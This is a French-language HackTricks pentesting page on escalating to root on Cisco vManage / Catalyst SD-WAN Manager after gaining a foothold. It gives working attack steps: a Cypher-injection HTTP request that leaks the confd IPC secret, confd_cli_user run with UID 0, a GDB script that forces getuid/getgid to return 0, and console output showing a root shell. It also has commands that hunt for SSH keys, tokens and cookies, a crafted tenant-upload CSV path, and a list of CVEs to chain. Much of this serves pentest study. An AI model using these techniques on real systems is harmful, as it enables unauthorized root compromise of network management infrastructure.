# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Une fois que vous avez obtenu une exécution de code sur Cisco vManage / *Catalyst SD-WAN Manager* en tant que `vmanage`, `netadmin` ou `vmanage-admin`, les surfaces locales de privesc les plus intéressantes sont généralement la stack CLI `confd`, l'helper `cmdptywrapper`, les API REST localhost et les handlers d'import/upload appartenant à root.

Si vous avez encore besoin du **foothold initial** sur un controller, consultez d'abord la page dédiée au control-plane :

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Triage local rapide
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Si `/etc/confd/confd_ipc_secret` est lisible depuis votre foothold, Path 1 et Path 2 deviennent immédiatement pratiques. Si vous êtes arrivé via une fuite d'informations distante ou un webshell, vérifiez également si vous pouvez déjà accéder au matériel SSH de `vmanage-admin` ou aux handlers d'upload de multitenancy : des recherches menées en 2026 ont montré que les deux constituaient des points d'appui réalistes.

## Path 1

(Exemple tiré de [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))<sup>[[5]](#references)</sup>

Après avoir consulté un peu de [documentation](http://66.218.245.39/doc/html/rn03re18.html) liée à `confd` et aux différents binaires (accessibles avec un compte sur le site web de Cisco), nous avons découvert que, pour authentifier le socket IPC, il utilise un secret situé dans `/etc/confd/confd_ipc_secret` :
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Vous souvenez-vous de notre instance Neo4j ? Elle s’exécute avec les privilèges de l’utilisateur `vmanage`, ce qui nous permet donc de récupérer le fichier à l’aide de la vulnérabilité précédente :
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Le programme `confd_cli` ne prend pas en charge les arguments de ligne de commande, mais appelle `/usr/bin/confd_cli_user` avec des arguments. Nous pourrions donc appeler directement `/usr/bin/confd_cli_user` avec notre propre ensemble d’arguments. Cependant, ce fichier n’est pas lisible avec nos privilèges actuels. Nous devons donc le récupérer depuis le rootfs et le copier à l’aide de scp, consulter l’aide et l’utiliser pour obtenir le shell :
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Chemin 2

(Exemple tiré de [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))<sup>[[6]](#references)</sup>

L’article<sup>[[5]](#references)</sup> de l’équipe synacktiv décrit une méthode élégante pour obtenir un root shell, mais le problème est qu’elle nécessite de récupérer une copie de `/usr/bin/confd_cli_user`, qui n’est lisible que par root. J’ai trouvé une autre façon d’escalader les privilèges vers root sans cette contrainte.

Lorsque j’ai désassemblé le binaire `/usr/bin/confd_cli`, j’ai observé ce qui suit :

<details>
<summary>Objdump montrant la collecte des UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Lorsque j’exécute « ps aux », j’observe ce qui suit (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
J’ai émis l’hypothèse que le programme « confd_cli » transmet l’ID utilisateur et l’ID de groupe récupérés auprès de l’utilisateur connecté à l’application « cmdptywrapper ».

Ma première tentative a consisté à exécuter directement « cmdptywrapper » en lui fournissant `-g 0 -u 0`, mais cela a échoué. Il semble qu’un descripteur de fichier (`-i 1015`) ait été créé quelque part en cours de route et que je ne puisse pas le falsifier.

Comme indiqué dans le blog de synacktiv (dernier exemple), le programme `confd_cli` ne prend pas en charge les arguments de ligne de commande, mais je peux l’influencer avec un debugger et, heureusement, GDB est inclus dans le système.

J’ai créé un script GDB dans lequel j’ai forcé les API `getuid` et `getgid` à retourner 0. Comme j’ai déjà le privilege « vmanage » grâce à la deserialization RCE, j’ai la permission de lire directement `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Console Output:

<details>
<summary>Sortie de la console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Chemin 3 (bug de validation des entrées de la CLI en 2025 - CVE-2025-20122)

Cisco a ensuite documenté une voie locale plus directe vers root dans son propre avis de sécurité concernant [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) : un **attaquant authentifié disposant uniquement de privilèges en lecture seule** pouvait envoyer une requête forgée à la CLI du manager et obtenir root en raison d'une validation insuffisante des entrées.<sup>[[7]](#references)</sup>

Du point de vue offensif, voici l'élément important à retenir :

1. Dès que vous disposez d'un *quelconque* accès initial low-priv sur la machine, vous devez tester le service CLI local avant de vous attaquer au workflow plus lourd du Chemin 1 / Chemin 2.
2. Réutilisez les artefacts du Chemin 2 pour trouver la frontière de confiance : `confd_cli` → `cmdptywrapper` → `vshell`.
3. Considérez chaque champ transmis au backend de la CLI comme suspect : UID/GID, nom d'utilisateur, métadonnées du terminal, fichiers importés ou toute valeur ensuite utilisée par un helper appartenant à root.
4. Si un utilisateur low-priv peut atteindre le socket CLI local et influencer ces champs, root peut n'être qu'à une requête forgée.

Un workflow pratique après avoir obtenu un accès à l'appliance est le suivant :
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Cela transforme le bug de 2025 en une bonne piste de recherche pour des versions similaires : recherchez des **wrappers CLI locaux qui collectent l'identité en userland et la transmettent à un wrapper plus privilégié**.

Ne confondez pas **CVE-2025-20122** avec le plus récent **CVE-2026-20122** : le problème de 2025 est un bug *local* de la CLI vers root, tandis que celui de 2026 est un écrasement arbitraire de fichier via une API *remote*, surtout utile pour implanter un foothold, puis revenir à Path 1 / Path 2 / Path 4.

## Path 4 (API REST low-priv de 2026 vers root - CVE-2026-20126)

L'advisory de Cisco de février 2026 a également introduit une autre classe utile de privesc : [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) permettait à un **attaquant local authentifié disposant de faibles privilèges** d'obtenir root en raison d'un mécanisme insuffisant d'authentification des utilisateurs dans l'API REST.<sup>[[1]](#references)</sup>

Cela est important, car le privesc sur vManage ne se limite désormais plus à l'abus de `confd`/TTY. Après avoir obtenu un shell avec de faibles privilèges, recherchez également :

- les endpoints d'API limités à localhost qui accordent trop de confiance à l'appelant
- les tokens, cookies ou credentials de service lisibles depuis le compte actuel
- les actions réservées à root exposées via les handlers `dataservice`/REST, qui peuvent toujours être déclenchées localement

En pratique, une fois que vous disposez d'un shell en tant que `vmanage` ou un autre utilisateur de service, l'abus de l'API locale est souvent plus discret et plus facile à automatiser que l'abus interactif de la CLI :
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Si le contexte de session local suffit pour accéder à des fonctionnalités REST privilégiées, privilégiez l’API : elle est plus facile à rejouer, à automatiser et à chaîner avec des sessions web ou des API tokens volés.

## Chemin 5 (fichier crafted traité par root - CVE-2026-20245)

Un autre pattern récent est [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx) : un attaquant local disposant de privilèges `netadmin` pouvait uploader un **fichier crafted** que le CLI traitait ensuite de manière non sécurisée, ce qui permettait une command injection en tant que `root`.<sup>[[2]](#references)</sup>

Du point de vue de HackTricks, la technique intéressante est plus large que le CVE spécifique :

1. Énumérez chaque workflow CLI ou web qui accepte un fichier : imports, bundles de diagnostic, templates, validators, backups, données de tenant, etc.
2. Identifiez où le fichier uploadé est placé et quel script ou binaire appartenant à root le consomme.
3. Testez si le nom du fichier, son contenu ou ses métadonnées parsées sont transmis à des commandes shell, des wrapper scripts ou des helpers de type `system()`.
4. Si vous pouvez déjà accéder à `netadmin` (identifiants valides, session volée ou chaîne d’auth-bypass), les bugs de traitement de fichiers constituent souvent le chemin le plus rapide vers root.

Google Cloud / Mandiant a ensuite montré un cas très concret de cette classe de bugs, exploité via le chemin d’import de multitenancy :<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Lors de l’attaque observée, le CSV forgé a finalement modifié `/etc/passwd` et `/etc/shadow` afin de créer un compte temporaire avec un UID 0 (`troot`).<sup>[[4]](#references)</sup> Cela rend les importateurs de type `tenant-upload` / `tenant-list` particulièrement intéressants : il ne s’agit pas seulement de fonctionnalités d’ingestion de données, mais de potentielles interfaces frontales de parseurs exécutés avec les privilèges du propriétaire root.

Un modèle de recherche rapide côté shell est :
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Cette classe de bug se combine particulièrement bien avec des footholds distants qui accordent `netadmin`, mais pas `root`.

## Autres vulnérabilités récentes de vManage/Catalyst SD-WAN Manager à combiner

- **Unauthenticated info leak (CVE-2026-20133)** – Particulièrement intéressante, car des recherches publiques ont montré qu'elle pouvait exposer `confd_ipc_secret` ou la clé privée `vmanage-admin`, transformant un bug de lecture en Path 1 ou en pivot NETCONF.<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Différente du bug CLI de 2025 ci-dessus ; VulnCheck l'a utilisée pour uploader un webshell, ce qui rend immédiatement pertinents les chemins de privesc locaux de cette page.<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – Voler une session admin dans l'interface web, puis pivoter vers des actions API/CLI qui finissent par atteindre `vshell` ou l'un des chemins de privesc locaux ci-dessus.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Très bon prérequis pour Path 5, car `netadmin` est exactement le niveau requis par la privesc via fichier forgé de 2026.<sup>[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – Valeur offensive similaire à celle de CVE-2026-20122, mais via un chemin d'upload plus récent de l'interface web : écrire dans un emplacement qui sera ensuite parsé par root ou par le web tier du plan de management.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Les intrusions de 2026 ont montré que les attaquants pouvaient revenir à une ancienne build SD-WAN vulnérable, exploiter l'ancien bug CLI permettant d'obtenir root, puis restaurer la version d'origine.<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Mieux documentée dans la page dédiée au control plane SD-WAN ; elle peut ajouter une clé SSH pour `vmanage-admin`, fournissant le foothold local nécessaire pour revenir sur cette page.



## Références

- [1] [Vulnérabilités Cisco Catalyst SD-WAN (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Vulnérabilité d'escalade de privilèges authentifiée de Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager et Catalyst SD-WAN Validator (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck : Herding Cats - Vulnérabilités récentes de Cisco SD-WAN Manager](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant : Exploitation zero-day d'une vulnérabilité (CVE-2026-20245) dans Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1: Attacking vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — From CSRF to Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Vulnérabilité d'escalade de privilèges de Cisco Catalyst SD-WAN Manager (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Exploitation active de Cisco Catalyst SD-WAN par UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)

{{#include ../../banners/hacktricks-training.md}}
